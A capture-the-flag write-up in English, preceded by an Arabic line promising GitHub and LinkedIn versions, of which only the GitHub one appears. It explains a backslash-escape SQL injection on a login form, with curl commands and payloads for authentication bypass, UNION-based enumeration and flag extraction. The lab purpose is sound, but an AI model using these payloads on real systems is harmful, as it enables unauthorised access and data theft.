تمام، ده نسختين:

1. إنجليزي قوية مناسبة GitHub
2. بوست عربي/إنجليزي مناسب LinkedIn (بنفس ستايل الفواصل)

---

# ✅ **GitHub Writeup (Professional English Version)**

````markdown
# Writeup: Admin Panel - SQL Injection via Backslash Escape

## Challenge Overview
- **Points:** 100  
- **Category:** Web / SQL Injection  
- **Target:** http://50.116.19.213:3000/  
- **Objective:** Bypass authentication and retrieve the flag  

---

## Vulnerability Summary

This challenge revolves around a **Backslash Escape SQL Injection**, a less common but powerful technique where a backslash (`\`) is used to escape a closing quote in SQL queries, leading to query manipulation.

---

## Step 1: Identifying the Injection Point

Initial testing with normal payloads resulted in errors. However, using a backslash revealed unusual behavior:

```bash
curl -X POST "http://50.116.19.213:3000/login" \
  -d "username=admin\\&password=test" -L
````

**Response:**

```
Error: (1064, "You have an error in your SQL syntax...")
```

### Why This Works

The backend query is likely:

```sql
SELECT * FROM users WHERE username='admin\' AND password='test'
```

* The backslash escapes the closing `'`
* This causes the query to break structure
* The password condition becomes injectable

---

## Step 2: Authentication Bypass

```bash
curl -X POST "http://50.116.19.213:3000/login" \
  -d "username=admin\\&password= OR 1=1#" \
  -c cookies.txt
```

### Final Query

```sql
SELECT * FROM users WHERE username='admin\' AND password=' OR 1=1#'
```

* `OR 1=1` makes condition always true
* `#` comments out the rest

**Result:**

```
Login successful
```

---

## Step 3: Accessing Admin Panel

```bash
curl -b cookies.txt http://50.116.19.213:3000/ -L
```

**Response:**

```html
<h1>Admin Panel</h1>
<p>Hello, admin Your CGPA is 2.00</p>
```

---

## Step 4: Enumerating Users

```bash
username=\\&password= OR 1=1 LIMIT 1,1#
```

**Result:**

```
Hello, hacker
```

---

## Step 5: Determining Column Count

```bash
username=\\&password= union select null,null,null#
```

**Error:**

```
different number of columns
```

✅ Correct number of columns = **2**

---

## Step 6: Finding the Flag Table

```bash
username=\\&password= union select 1,2 from flag#
```

**Response:**

```
Hello, 1
```

✅ `flag` table exists

---

## Step 7: Extracting the Flag

```bash
username=\\&password= union select value,1 from flag#
```

**Result:**

```html
Hello, KCTF{0c259a70a089442a7e622d02bb5d911f}
```

---

## Flag

```
KCTF{0c259a70a089442a7e622d02bb5d911f}
```

---

## Key Takeaways

* Backslash escaping can **break SQL parsing logic**
* Not all SQLi protections handle this edge case
* Always test:

  * unusual characters (`\`, `'`, `"`)
  * encoding tricks
* UNION-based extraction still works after bypass

---

## Reproduction Commands

```bash
# Detect vulnerability
curl -X POST "http://50.116.19.213:3000/login" -d "username=admin\\&password=test" -L

# Login bypass
curl -X POST "http://50.116.19.213:3000/login" -d "username=admin\\&password= OR 1=1#" -c cookies.txt

# Extract flag
curl -X POST "http://50.116.19.213:3000/login" -d "username=\\&password= union select value,1 from flag#" -c flag.txt
curl -b flag.txt http://50.116.19.213:3000/ -L
```